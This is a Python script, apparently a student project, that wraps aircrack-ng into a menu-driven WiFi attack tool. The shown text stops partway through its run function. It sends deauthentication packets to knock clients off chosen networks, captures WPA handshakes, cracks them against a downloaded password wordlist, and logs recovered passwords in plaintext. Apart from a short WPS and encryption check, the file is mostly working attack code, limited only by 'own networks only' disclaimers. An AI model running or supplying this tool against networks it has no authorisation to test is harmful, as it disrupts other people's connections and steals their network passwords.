#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║     ██╗    ██╗██╗███████╗██╗      █████╗ ██╗   ██╗██████╗ ██╗████████╗     ║
║     ██║    ██║██║██╔════╝██║     ██╔══██╗██║   ██║██╔══██╗██║╚══██╔══╝     ║
║     ██║ █╗ ██║██║█████╗  ██║     ███████║██║   ██║██████╔╝██║   ██║        ║
║     ██║███╗██║██║██╔══╝  ██║     ██╔══██║██║   ██║██╔══██╗██║   ██║        ║
║     ╚███╔███╔╝██║██║     ███████╗██║  ██║╚██████╔╝██║  ██║██║   ██║        ║
║      ╚══╝╚══╝ ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝        ║
║                                                                              ║
║     🔐 WiFi Security Auditor - Educational Purpose Only                     ║
║     👨‍💻 Author: Abd Ur Rab                                                  ║
║     🎓 Cybersecurity Student                                                ║
║     ⚠️  USE ONLY ON YOUR OWN NETWORKS!                                      ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import subprocess
import re
import json
import random
import platform
from datetime import datetime

# ============================================================================
# DEPENDENCY CHECK & INSTALLATION
# ============================================================================

def install_dependencies():
    """Auto-install required packages"""
    try:
        import rich
        import pyfiglet
        import termcolor
    except ImportError:
        print("[*] Installing required packages...")
        subprocess.run("pip install rich pyfiglet termcolor colorama -q", shell=True)
        print("[✓] Dependencies installed")

install_dependencies()

# Now import after ensuring they're installed
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
    from rich.prompt import Prompt, Confirm
    from rich import box
    from rich.text import Text
    import pyfiglet
    from termcolor import colored
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
except ImportError as e:
    print(f"[!] Error importing modules: {e}")
    print("[*] Running: pip install rich pyfiglet termcolor colorama")
    subprocess.run("pip install rich pyfiglet termcolor colorama", shell=True)
    os.execv(sys.executable, ['python'] + sys.argv)

console = Console()

# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

class Utils:
    """Utility functions"""
    
    @staticmethod
    def clear_screen():
        """Clear terminal"""
        os.system('clear' if os.name == 'posix' else 'cls')
    
    @staticmethod
    def get_timestamp():
        """Get formatted timestamp"""
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    @staticmethod
    def get_date():
        """Get date string"""
        return datetime.now().strftime("%Y%m%d_%H%M%S")
    
    @staticmethod
    def log(message, log_file="audit_log.txt"):
        """Log message to file"""
        try:
            with open(log_file, 'a') as f:
                f.write(f"[{Utils.get_timestamp()}] {message}\n")
        except:
            pass

# ============================================================================
# BANNER CLASS
# ============================================================================

class Banner:
    """Banner display class"""
    
    @staticmethod
    def display():
        """Display main banner"""
        Utils.clear_screen()
        
        # ASCII Art Title
        title = """
    ╔═══════════════════════════════════════════════════════════════╗
    ║  █████╗ ██████╗ ██████╗     ██╗   ██╗██████╗     ██████╗  ║
    ║ ██╔══██╗██╔══██╗██╔══██╗    ██║   ██║██╔══██╗    ██╔══██╗ ║
    ║ ███████║██████╔╝██████╔╝    ██║   ██║██████╔╝    ██████╔╝ ║
    ║ ██╔══██║██╔══██╗██╔══██╗    ██║   ██║██╔══██╗    ██╔══██╗ ║
    ║ ██║  ██║██████╔╝██████╔╝    ╚██████╔╝██║  ██║    ██████╔╝ ║
    ║ ╚═╝  ╚═╝╚═════╝ ╚═════╝     ╚═════╝ ╚═╝  ╚═╝    ╚═════╝  ║
    ╚═══════════════════════════════════════════════════════════════╝
        """
        console.print(colored(title, 'cyan', attrs=['bold']))
        
        # Info Panel
        console.print(Panel(
            "[bold cyan]🔐 WiFi Security Auditor v4.0[/bold cyan]\n"
            "[yellow]⚡ Educational Purpose Only ⚡[/yellow]\n"
            "[green]👨‍💻 Author: Abd Ur Rab[/green]\n"
            "[magenta]🎓 Cybersecurity Student[/magenta]\n"
            f"[white]📅 {Utils.get_timestamp()}[/white]\n"
            "[dim]💡 Use Only On Your Own Networks![/dim]",
            border_style="cyan",
            box=box.DOUBLE_EDGE
        ))
        
        # Random Security Quote
        quotes = [
            "🔒 Security is not a product, it's a process.",
            "🛡️ The only secure computer is one that's turned off.",
            "⚔️ Knowledge is power, but wisdom is knowing how to use it.",
            "🎯 With great power comes great responsibility.",
            "🔐 Encryption is your friend, use it wisely.",
            "💡 The best defense is a good offense.",
            "🔑 Strong passwords are the first line of defense.",
            "🛡️ Security is a journey, not a destination."
        ]
        console.print(f"[italic cyan]💭 {random.choice(quotes)}[/italic cyan]\n")

# ============================================================================
# WIFI SCANNER CLASS
# ============================================================================

class WiFiScanner:
    """WiFi scanning and monitoring"""
    
    def __init__(self):
        self.interface = None
        self.monitor_interface = None
        self.networks = []
        self.vendors = self._load_vendors()
    
    def _load_vendors(self):
        """Load MAC vendor database"""
        return {
            '00:11:22': 'Cisco', '00:1A:2B': 'Netgear', '00:1E:2F': 'D-Link',
            '00:24:36': 'Apple', '00:14:22': 'Linksys', 'F0:9F:C2': 'TP-Link',
            'B0:75:D5': 'Huawei', '88:C6:26': 'Asus', '00:15:5D': 'Microsoft',
            '00:50:56': 'VMware', 'E0:91:F5': 'Samsung', '00:23:45': 'Belkin',
            '00:16:EA': 'Sony', '00:18:4D': 'Intel', '00:1C:DF': 'Broadcom',
            '00:21:5A': 'Ralink', '00:22:6B': 'Atheros', '00:25:9C': 'Realtek',
            '00:1F:3B': 'Qualcomm', '70:1A:04': 'Xiaomi', '00:0C:41': 'D-Link',
            '00:12:17': 'Samsung', '00:16:01': 'Microsoft', '00:1A:E3': 'Dell',
            '00:1D:4F': 'HP', '00:1E:68': 'Compaq', '00:1F:16': 'Acer',
            '00:20:91': 'Actiontec', '00:24:FE': 'ZTE', '00:26:5A': 'Motorola'
        }
    
    def _get_vendor(self, mac):
        """Get vendor from MAC address"""
        if not mac or len(mac) < 8:
            return 'Unknown'
        for prefix, vendor in self.vendors.items():
            if mac.upper().startswith(prefix.upper()):
                return vendor
        return 'Unknown'
    
    def _get_interfaces(self):
        """Get available wireless interfaces"""
        try:
            result = subprocess.run(
                "iwconfig 2>/dev/null | grep -E '^[a-z]' | awk '{print $1}'",
                shell=True, capture_output=True, text=True
            )
            interfaces = result.stdout.strip().split('\n')
            return [i for i in interfaces if i]
        except:
            return []
    
    def enable_monitor_mode(self):
        """Enable monitor mode"""
        interfaces = self._get_interfaces()
        
        if not interfaces:
            console.print("[red]❌ No wireless interfaces found![/red]")
            return False
        
        console.print("\n[cyan]📡 Available Interfaces:[/cyan]")
        for idx, iface in enumerate(interfaces, 1):
            console.print(f"  [yellow]{idx}[/yellow]. [green]{iface}[/green]")
        
        choice = Prompt.ask("\n[yellow]Select interface number[/yellow]", default="1")
        
        try:
            self.interface = interfaces[int(choice) - 1]
        except:
            self.interface = interfaces[0]
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        ) as progress:
            task = progress.add_task(
                f"[cyan]Enabling monitor mode on {self.interface}...",
                total=100
            )
            
            # Kill conflicting processes
            subprocess.run("airmon-ng check kill", shell=True, 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            progress.update(task, advance=30)
            
            # Enable monitor mode
            result = subprocess.run(
                f"airmon-ng start {self.interface}",
                shell=True, capture_output=True, text=True
            )
            progress.update(task, advance=70)
            
            # Parse new interface name
            if "mon" in result.stdout:
                self.monitor_interface = f"{self.interface}mon"
            else:
                self.monitor_interface = self.interface
        
        console.print(f"\n[green]✅ Monitor mode enabled on [bold]{self.monitor_interface}[/bold][/green]")
        Utils.log(f"Monitor mode enabled on {self.monitor_interface}")
        return True
    
    def scan_networks(self, duration=30):
        """Scan for WiFi networks"""
        console.print(f"\n[yellow]📡 Scanning networks for {duration} seconds...[/yellow]")
        console.print("[dim]Press Ctrl+C to stop early[/dim]")
        
        # Create directories
        os.makedirs("scans", exist_ok=True)
        
        # Start airodump scan
        cmd = (
            f"airodump-ng {self.monitor_interface} "
            f"--write scans/scan --output-format csv 2>/dev/null"
        )
        process = subprocess.Popen(
            cmd, shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        # Progress bar
        try:
            with Progress() as progress:
                task = progress.add_task("[cyan]Scanning...", total=duration)
                for i in range(duration):
                    time.sleep(1)
                    progress.update(task, advance=1)
        except KeyboardInterrupt:
            console.print("\n[yellow]⏹️ Scan interrupted[/yellow]")
        
        process.terminate()
        time.sleep(2)
        
        # Parse results
        networks = self._parse_scan_results("scans/scan-01.csv")
        self.networks = networks
        
        if networks:
            console.print(f"\n[green]✅ Found [bold]{len(networks)}[/bold] networks[/green]")
            Utils.log(f"Found {len(networks)} networks")
        else:
            console.print("\n[red]❌ No networks found[/red]")
        
        return networks
    
    def _parse_scan_results(self, filename):
        """Parse airodump CSV output"""
        networks = []
        try:
            if not os.path.exists(filename):
                return []
            
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            
            for line in lines:
                if "Station" in line or "BSSID" in line or not line.strip():
                    continue
                
                parts = line.strip().split(',')
                if len(parts) >= 15:
                    bssid = parts[0].strip()
                    channel = parts[3].strip()
                    essid = parts[13].strip()
                    encryption = parts[5].strip() if len(parts) > 5 else "Unknown"
                    power = parts[8].strip() if len(parts) > 8 else "0"
                    
                    if bssid and essid and essid != "" and essid != "x":
                        networks.append({
                            'bssid': bssid,
                            'channel': channel,
                            'essid': essid,
                            'encryption': encryption,
                            'power': power,
                            'vendor': self._get_vendor(bssid)
                        })
            
            # Clean up
            if os.path.exists(filename):
                os.remove(filename)
            if os.path.exists("scans/scan-01.kismet.csv"):
                os.remove("scans/scan-01.kismet.csv")
            if os.path.exists("scans/scan-01.kismet.netxml"):
                os.remove("scans/scan-01.kismet.netxml")
                
        except Exception as e:
            Utils.log(f"Parse error: {e}")
        
        return networks
    
    def display_networks(self, networks=None):
        """Display networks in a beautiful table"""
        if networks is None:
            networks = self.networks
        
        if not networks:
            console.print("[red]❌ No networks available. Scan first![/red]")
            return
        
        table = Table(
            title="📶 WiFi Networks Detected",
            title_style="bold cyan",
            box=box.ROUNDED,
            show_header=True,
            header_style="bold yellow"
        )
        
        table.add_column("#", style="cyan", width=4)
        table.add_column("SSID", style="green", no_wrap=True)
        table.add_column("BSSID", style="yellow")
        table.add_column("CH", style="magenta", width=4)
        table.add_column("Encryption", style="red")
        table.add_column("Signal", style="blue", width=10)
        table.add_column("Vendor", style="white")
        
        for idx, net in enumerate(networks[:25], 1):
            # Signal strength color
            try:
                power = int(net['power'])
            except:
                power = 0
            signal_color = "green" if power > -50 else "yellow" if power > -70 else "red"
            
            table.add_row(
                str(idx),
                net['essid'][:25] or "(Hidden)",
                net['bssid'],
                net['channel'],
                net['encryption'][:10] or "Open",
                f"[{signal_color}]{net['power']} dBm[/{signal_color}]",
                net['vendor'][:12]
            )
        
        console.print("\n" + "═"*80)
        console.print(table)
        console.print(f"[cyan]Total: [bold]{len(networks)}[/bold] networks[/cyan]")
        console.print("═"*80 + "\n")
        
        # Save report
        self._save_networks_report(networks)
    
    def _save_networks_report(self, networks):
        """Save networks to report file"""
        os.makedirs("reports", exist_ok=True)
        filename = f"reports/networks_{Utils.get_date()}.txt"
        
        with open(filename, 'w') as f:
            f.write("="*60 + "\n")
            f.write("WiFi Networks Scan Report\n")
            f.write(f"Date: {Utils.get_timestamp()}\n")
            f.write("Author: Abd Ur Rab\n")
            f.write("="*60 + "\n\n")
            
            for net in networks:
                f.write(f"SSID: {net['essid']}\n")
                f.write(f"BSSID: {net['bssid']}\n")
                f.write(f"Channel: {net['channel']}\n")
                f.write(f"Encryption: {net['encryption']}\n")
                f.write(f"Signal: {net['power']} dBm\n")
                f.write(f"Vendor: {net['vendor']}\n")
                f.write("-"*40 + "\n")
        
        console.print(f"[dim]📄 Report saved: {filename}[/dim]")
    
    def cleanup(self):
        """Cleanup monitor mode"""
        if self.monitor_interface:
            subprocess.run(
                f"airmon-ng stop {self.monitor_interface}",
                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            subprocess.run(
                "airmon-ng check kill",
                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            console.print("[green]✅ Cleanup complete[/green]")
            Utils.log("Cleanup completed")

# ============================================================================
# HANDSHAKE CAPTURE CLASS
# ============================================================================

class HandshakeCapturer:
    """Capture WPA handshake"""
    
    def __init__(self, scanner):
        self.scanner = scanner
        self.capture_file = None
    
    def capture(self, networks=None):
        """Capture handshake from selected network"""
        if networks is None:
            networks = self.scanner.networks
        
        if not networks:
            console.print("[red]❌ No networks available. Scan first![/red]")
            return None
        
        # Display networks
        self.scanner.display_networks(networks)
        
        choice = Prompt.ask("\n[yellow]Select network number[/yellow]")
        
        try:
            net = networks[int(choice) - 1]
        except:
            console.print("[red]❌ Invalid selection![/red]")
            return None
        
        bssid = net['bssid']
        channel = net['channel']
        essid = net['essid']
        
        console.print(Panel(
            f"""
[bold cyan]🎯 Target Network[/bold cyan]
SSID: [green]{essid}[/green]
BSSID: [yellow]{bssid}[/yellow]
Channel: [magenta]{channel}[/magenta]
Encryption: [red]{net['encryption']}[/red]
            """,
            border_style="cyan",
            box=box.ROUNDED
        ))
        
        if not Confirm.ask("\n[yellow]Start handshake capture?[/yellow]"):
            return None
        
        # Set channel
        subprocess.run(
            f"iwconfig {self.scanner.monitor_interface} channel {channel}",
            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        
        # Start capture
        os.makedirs("captures", exist_ok=True)
        filename = f"captures/handshake_{Utils.get_date()}"
        
        cmd = (
            f"airodump-ng -c {channel} --bssid {bssid} "
            f"-w {filename} {self.scanner.monitor_interface} 2>/dev/null"
        )
        process = subprocess.Popen(
            cmd, shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        console.print("\n[yellow]⏳ Capturing handshake... (30 seconds)[/yellow]")
        console.print("[red]⚠️ Sending deauth packets to force reconnection...[/red]")
        
        # Send deauth packets
        deauth_cmd = (
            f"aireplay-ng -0 10 -a {bssid} "
            f"{self.scanner.monitor_interface} 2>/dev/null"
        )
        subprocess.Popen(
            deauth_cmd, shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        # Progress
        with Progress() as progress:
            task = progress.add_task("[cyan]Capturing...", total=30)
            for i in range(30):
                time.sleep(1)
                progress.update(task, advance=1)
        
        process.terminate()
        time.sleep(2)
        
        # Check for handshake
        capture_file = f"{filename}-01.cap"
        if os.path.exists(capture_file):
            result = subprocess.run(
                f"aircrack-ng {capture_file} 2>/dev/null | grep '1 handshake'",
                shell=True, capture_output=True, text=True
            )
            
            if "1 handshake" in result.stdout:
                console.print("\n[green]✅ Handshake captured successfully![/green]")
                self.capture_file = capture_file
                Utils.log(f"Handshake captured: {capture_file}")
                return capture_file
            else:
                console.print("\n[red]❌ No handshake captured. Try again.[/red]")
                if os.path.exists(capture_file):
                    os.remove(capture_file)
                return None
        else:
            console.print("\n[red]❌ Capture file not found![/red]")
            return None
    
    def deauth_attack(self, networks=None, count=10):
        """Perform deauth attack (educational)"""
        if networks is None:
            networks = self.scanner.networks
        
        if not networks:
            console.print("[red]❌ No networks available[/red]")
            return
        
        self.scanner.display_networks(networks)
        
        choice = Prompt.ask("\n[yellow]Select network[/yellow]")
        
        try:
            net = networks[int(choice) - 1]
        except:
            console.print("[red]❌ Invalid selection![/red]")
            return
        
        console.print(Panel(
            f"[red]⚠️ DEAUTH ATTACK - EDUCATIONAL USE ONLY![/red]\n"
            f"Target: [yellow]{net['essid']}[/yellow]",
            border_style="red"
        ))
        
        if not Confirm.ask("\n[red]⚠️ REALLY perform deauth attack?[/red]"):
            return
        
        console.print(f"\n[red]🔥 Sending {count} deauth packets to {net['essid']}...[/red]")
        cmd = (
            f"aireplay-ng -0 {count} -a {net['bssid']} "
            f"{self.scanner.monitor_interface} 2>/dev/null"
        )
        process = subprocess.Popen(cmd, shell=True)
        process.wait()
        
        console.print("[green]✅ Deauth attack completed[/green]")
        Utils.log(f"Deauth attack on {net['essid']}")

# ============================================================================
# PASSWORD CRACKER CLASS
# ============================================================================

class PasswordCracker:
    """Crack WPA passwords"""
    
    def __init__(self):
        self.handshake_file = None
    
    def set_handshake(self, handshake_file):
        """Set handshake file"""
        self.handshake_file = handshake_file
    
    def crack(self, wordlist=None):
        """Crack password using wordlist"""
        if not self.handshake_file:
            console.print("[red]❌ No handshake file! Capture one first.[/red]")
            return None
        
        if not os.path.exists(self.handshake_file):
            console.print(f"[red]❌ File not found: {self.handshake_file}[/red]")
            return None
        
        # Setup wordlist
        if wordlist is None:
            wordlist = "wordlists/small.txt"
        
        os.makedirs("wordlists", exist_ok=True)
        
        if not os.path.exists(wordlist):
            console.print("[yellow]⬇️ Downloading wordlist...[/yellow]")
            self._download_wordlist(wordlist)
        
        console.print("\n[yellow]🔓 Starting password cracking...[/yellow]")
        console.print("[dim]This may take a while...[/dim]")
        
        # Run aircrack
        cmd = f"aircrack-ng -w {wordlist} {self.handshake_file} 2>/dev/null"
        process = subprocess.Popen(
            cmd, shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        # Show progress
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            transient=True
        ) as progress:
            task = progress.add_task("[cyan]Cracking password...", total=None)
            while process.poll() is None:
                time.sleep(0.5)
        
        output = process.communicate()[0]
        
        # Parse result
        match = re.search(r"KEY FOUND! \[ (.*?) \]", output)
        if match:
            password = match.group(1)
            console.print(f"\n[green]✅ Password found: [bold cyan]{password}[/bold cyan][/green]")
            
            # Save result
            os.makedirs("reports", exist_ok=True)
            with open("reports/cracked_passwords.txt", 'a') as f:
                f.write(f"{Utils.get_timestamp()} - {self.handshake_file} - Password: {password}\n")
            
            Utils.log(f"Password cracked: {password}")
            return password
        else:
            console.print("\n[red]❌ Password not found in wordlist[/red]")
            console.print("[yellow]💡 Try a larger wordlist like rockyou.txt[/yellow]")
            return None
    
    def _download_wordlist(self, path):
        """Download a wordlist"""
        try:
            import requests
            url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100.txt"
            response = requests.get(url, timeout=30)
            with open(path, 'w') as f:
                f.write(response.text)
            console.print("[green]✅ Wordlist downloaded[/green]")
        except:
            # Create default wordlist
            console.print("[yellow]Creating default wordlist...[/yellow]")
            default_passwords = [
                "password", "123456", "123456789", "12345678", "12345",
                "1234567", "qwerty", "abc123", "password1", "admin",
                "letmein", "welcome", "monkey", "dragon", "master",
                "sunshine", "iloveyou", "princess", "admin123", "123123"
            ]
            with open(path, 'w') as f:
                f.write('\n'.join(default_passwords))
            console.print("[green]✅ Default wordlist created[/green]")

# ============================================================================
# SECURITY AUDITOR CLASS
# ============================================================================

class SecurityAuditor:
    """Security audit and reporting"""
    
    def __init__(self, scanner):
        self.scanner = scanner
        self.audit_results = {}
    
    def perform_audit(self, networks=None):
        """Perform security audit"""
        if networks is None:
            networks = self.scanner.networks
        
        if not networks:
            console.print("[red]❌ No networks available. Scan first![/red]")
            return
        
        self.scanner.display_networks(networks)
        
        choice = Prompt.ask("\n[yellow]Select network for audit[/yellow]")
        
        try:
            net = networks[int(choice) - 1]
        except:
            console.print("[red]❌ Invalid selection![/red]")
            return
        
        bssid = net['bssid']
        essid = net['essid']
        
        console.print(Panel(
            f"[bold cyan]🔍 Security Audit: [green]{essid}[/green][/bold cyan]",
            border_style="cyan"
        ))
        
        results = []
        
        # 1. Check WPS
        console.print("\n[yellow]⏳ Checking WPS...[/yellow]")
        wps_result = subprocess.run(
            f"wash -i {self.scanner.monitor_interface} -b {bssid} 2>/dev/null | grep -i wps",
            shell=True, capture_output=True, text=True
        )
        
        if "WPS" in wps_result.stdout:
            results.append(("WPS", "❌ VULNERABLE", "red", "Disable WPS immediately!"))
        else:
            results.append(("WPS", "✅ Disabled", "green", "Good"))
        
        # 2. Check encryption
        console.print("[yellow]⏳ Checking encryption...[/yellow]")
        enc_result = subprocess.run(
            f"airodump-ng {self.scanner.monitor_interface} --bssid {bssid} -c {net['channel']} 2>/dev/null | grep {bssid}",
            shell=True, capture_output=True, text=True
        )
        
        if "WPA3" in enc_result.stdout:
            results.append(("Encryption", "✅ WPA3 - Excellent", "green", "Best security"))
        elif "WPA2" in enc_result.stdout:
            results.append(("Encryption", "⚠️ WPA2 - Moderate", "yellow", "Use strong password"))
        elif "WEP" in enc_result.stdout:
            results.append(("Encryption", "❌ WEP - VERY WEAK!", "red", "Upgrade immediately!"))
        else:
            results.append(("Encryption", "❌ OPEN - NO SECURITY!", "red", "Enable encryption!"))
        
        # 3. Signal strength
        try:
            power = int(net['power'])
            if power > -50:
                results.append(("Signal", "⚠️ Strong", "yellow", "Reduce if possible"))
            elif power > -70:
                results.append(("Signal", "✅ Moderate", "green", "Good"))
            else:
                results.append(("Signal", "✅ Weak", "green", "Good"))
        except:
            results.append(("Signal", "Unknown", "yellow", "N/A"))
        
        # 4. Vendor
        results.append(("Vendor", net['vendor'], "cyan", "Device manufacturer"))
        
        # Display results table
        table = Table(title="🔍 Audit Results", box=box.ROUNDED)
        table.add_column("Check", style="cyan")
        table.add_column("Result", style="white")
        table.add_column("Status", style="white")
        table.add_column("Recommendation", style="dim")
        
        for check, result, color, rec in results:
            table.add_row(check, result, f"[{color}]●[/{color}]", rec)
        
        console.print(table)
        
        # Recommendations summary
        console.print(Panel(
            "[bold cyan]💡 Security Recommendations[/bold cyan]\n\n"
            "1. [green]Use WPA3 encryption[/green]\n"
            "2. [yellow]Use strong password (12+ characters)[/yellow]\n"
            "3. [red]Disable WPS[/red]\n"
            "4. [green]Keep firmware updated[/green]\n"
            "5. [green]Monitor connected devices[/green]",
            border_style="cyan"
        ))
        
        # Save audit report
        self._save_audit_report(net, results)
    
    def _save_audit_report(self, network, results):
        """Save audit report"""
        os.makedirs("reports", exist_ok=True)
        filename = f"reports/audit_{network['bssid'].replace(':', '')}_{Utils.get_date()}.txt"
        
        with open(filename, 'w') as f:
            f.write("="*60 + "\n")
            f.write("WIFI SECURITY AUDIT REPORT\n")
            f.write("="*60 + "\n")
            f.write(f"Date: {Utils.get_timestamp()}\n")
            f.write(f"Author: Abd Ur Rab\n")
            f.write("="*60 + "\n\n")
            
            f.write(f"Target: {network['essid']}\n")
            f.write(f"BSSID: {network['bssid']}\n")
            f.write(f"Channel: {network['channel']}\n")
            f.write(f"Encryption: {network['encryption']}\n")
            f.write(f"Signal: {network['power']} dBm\n")
            f.write(f"Vendor: {network['vendor']}\n")
            f.write("\n" + "-"*60 + "\n")
            
            f.write("\nAUDIT RESULTS:\n")
            for check, result, color, rec in results:
                f.write(f"{check}: {result} - {rec}\n")
            
            f.write("\n" + "="*60 + "\n")
            f.write("RECOMMENDATIONS\n")
            f.write("="*60 + "\n")
            f.write("1. Use WPA3 encryption\n")
            f.write("2. Use strong passwords\n")
            f.write("3. Disable WPS\n")
            f.write("4. Keep firmware updated\n")
            f.write("5. Monitor connected devices\n")
        
        console.print(f"\n[dim]📄 Audit report saved: {filename}[/dim]")
        Utils.log(f"Audit report saved: {filename}")

# ============================================================================
# MAIN APPLICATION
# ============================================================================

class WiFiAuditorApp:
    """Main application class"""
    
    def __init__(self):
        self.scanner = WiFiScanner()
        self.handshake = HandshakeCapturer(self.scanner)
        self.cracker = PasswordCracker()
        self.auditor = SecurityAuditor(self.scanner)
        self.networks = []
        self.captured_data = {}
    
    def check_root(self):
        """Check root access"""
        if os.geteuid() != 0:
            console.print("\n[red]❌ Root access required![/red]")
            console.print("[yellow]💡 Run: [bold]sudo python3 wifiauditor.py[/bold][/yellow]")
            return False
        return True
    
    def check_tools(self):
        """Check required tools"""
        tools = ['aircrack-ng', 'airodump-ng', 'aireplay-ng', 'airmon-ng', 'iwconfig']
        missing = []
        
        for tool in tools:
            if subprocess.run(f"which {tool}", shell=True, capture_output=True).returncode != 0:
                missing.append(tool)
        
        if missing:
            console.print(f"\n[yellow]⚠️ Missing tools: {', '.join(missing)}[/yellow]")
            if Confirm.ask("[cyan]Install missing tools?[/cyan]"):
                subprocess.run("pkg install aircrack-ng -y", shell=True)
                console.print("[green]✅ Tools installed[/green]")
        
        return True
    
    def main_menu(self):
        """Display main menu"""
        Banner.display()
        
        console.print("\n[bold cyan]" + "═"*50 + "[/bold cyan]")
        console.print("[bold yellow]🎯 MAIN MENU[/bold yellow]")
        console.print("[bold cyan]" + "═"*50 + "[/bold cyan]\n")
        
        menu = [
            ("1", "📡 Scan Networks", "Scan for WiFi networks"),
            ("2", "📊 Show Networks", "Display detected networks"),
            ("3", "🤝 Capture Handshake", "Capture WPA handshake"),
            ("4", "🔓 Crack Password", "Crack captured handshake"),
            ("5", "🔍 Security Audit", "Audit network security"),
            ("6", "⚡ Deauth Attack", "Force disconnection (TEST)"),
            ("7", "📄 Generate Report", "Create comprehensive report"),
            ("8", "❓ Help", "Show help information"),
            ("9", "🚪 Exit", "Exit the tool")
        ]
        
        for num, name, desc in menu:
            console.print(f"[cyan]{num}[/cyan] [green]{name:20}[/green] [dim]- {desc}[/dim]")
        
        console.print("\n[bold cyan]" + "═"*50 + "[/bold cyan]")
        choice = Prompt.ask("\n[bold yellow]Select option[/bold yellow]")
        
        return choice
    
    def handle_scan(self):
        """Handle network scanning"""
        duration = Prompt.ask("[cyan]Scan duration (seconds)[/cyan]", default="30")
        try:
            duration = int(duration)
        except:
            duration = 30
        
        self.networks = self.scanner.scan_networks(duration)
        if self.networks:
            self.scanner.display_networks(self.networks)
        return self.networks
    
    def handle_show_networks(self):
        """Show networks"""
        if not self.networks:
            console.print("[red]❌ No networks. Run scan first![/red]")
            return
        self.scanner.display_networks(self.networks)
    
    def handle_handshake(self):
        """Handle handshake capture"""
        if not self.networks:
            console.print("[red]❌ No networks. Run scan first![/red]")
            if Confirm.ask("[yellow]Scan now?[/yellow]"):
                self.handle_scan()
            else:
                return
        
        capture_file = self.handshake.capture(self.networks)
        if capture_file:
            self.captured_data['handshake'] = capture_file
            self.cracker.set_handshake(capture_file)
        return capture_file
    
    def handle_crack(self):
        """Handle password cracking"""
        if 'handshake' not in self.captured_data:
            console.print("[yellow]No handshake found. Capture one now?[/yellow]")
            if Confirm.ask("Capture handshake?"):
                self.handle_handshake()
            else:
                return
        
        wordlist = Prompt.ask(
            "[cyan]Wordlist path[/cyan]",
            default="wordlists/small.txt"
        )
        
        password = self.cracker.crack(wordlist)
        if password:
            self.captured_data['password'] = password
        return password
    
    def handle_audit(self):
        """Handle security audit"""
        if not self.networks:
            console.print("[red]❌ No networks. Run scan first![/red]")
            if Confirm.ask("[yellow]Scan now?[/yellow]"):
                self.handle_scan()
            else:
                return
        
        self.auditor.perform_audit(self.networks)
    
    def handle_deauth(self):
        """Handle deauth attack"""
        if not self.networks:
            console.print("[red]❌ No networks. Run scan first![/red]")
            return
        
        count = Prompt.ask("[cyan]Number of packets[/cyan]", default="10")
        try:
            count = int(count)
        except:
            count = 10
        
        self.handshake.deauth_attack(self.networks, count)
    
    def handle_report(self):
        """Generate comprehensive report"""
        if not self.networks:
            console.print("[red]❌ No data to report! Scan first.[/red]")
            return
        
        os.makedirs("reports", exist_ok=True)
        filename = f"reports/complete_report_{Utils.get_date()}.txt"
        
        with open(filename, 'w') as f:
            f.write("="*70 + "\n")
            f.write("COMPLETE WIFI SECURITY REPORT\n")
            f.write("="*70 + "\n")
            f.write(f"Generated: {Utils.get_timestamp()}\n")
            f.write("Author: Abd Ur Rab\n")
            f.write("="*70 + "\n\n")
            
            f.write("NETWORKS FOUND:\n")
            f.write("-"*70 + "\n")
            for net in self.networks:
                f.write(f"SSID: {net['essid']}\n")
                f.write(f"BSSID: {net['bssid']}\n")
                f.write(f"Channel: {net['channel']}\n")
                f.write(f"Encryption: {net['encryption']}\n")
                f.write(f"Signal: {net['power']} dBm\n")
                f.write(f"Vendor: {net['vendor']}\n")
                f.write("-"*50 + "\n")
            
            if 'handshake' in self.captured_data:
                f.write(f"\nHANDSHAKE CAPTURED: {self.captured_data['handshake']}\n")
            
            if 'password' in self.captured_data:
                f.write(f"\nPASSWORD CRACKED: {self.captured_data['password']}\n")
            
            f.write("\n" + "="*70 + "\n")
            f.write("END OF REPORT\n")
            f.write("="*70 + "\n")
        
        console.print(f"\n[green]✅ Complete report saved: {filename}[/green]")
        Utils.log(f"Report generated: {filename}")
    
    def handle_help(self):
        """Show help"""
        console.print(Panel(
            """
[bold cyan]📚 HELP - WiFi Security Auditor[/bold cyan]

[bold yellow]📌 Features:[/bold yellow]
• [green]Scan Networks[/green] - Discover nearby WiFi networks
• [green]Show Networks[/green] - Display detected networks
• [green]Capture Handshake[/green] - Capture WPA/WPA2 handshake
• [green]Crack Password[/green] - Crack captured handshake
• [green]Security Audit[/green] - Analyze network security
• [green]Deauth Attack[/green] - Force disconnection (Educational)
• [green]Generate Report[/green] - Create comprehensive report

[bold yellow]⚠️ Important:[/bold yellow]
• [red]USE ONLY ON YOUR OWN NETWORKS![/red]
• [cyan]Requires root access[/cyan]
• [yellow]Educational purpose only[/yellow]
• [green]Stay ethical and legal[/green]

[bold magenta]👨‍💻 Author: Abd Ur Rab[/bold magenta]
[bold blue]🎓 Cybersecurity Student[/bold blue]
            """,
            border_style="cyan",
            title="Help",
            box=box.DOUBLE_EDGE
        ))
    
    def run(self):
        """Main application loop"""
        # Check root
        if not self.check_root():
            sys.exit(1)
        
        # Check tools
        self.check_tools()
        
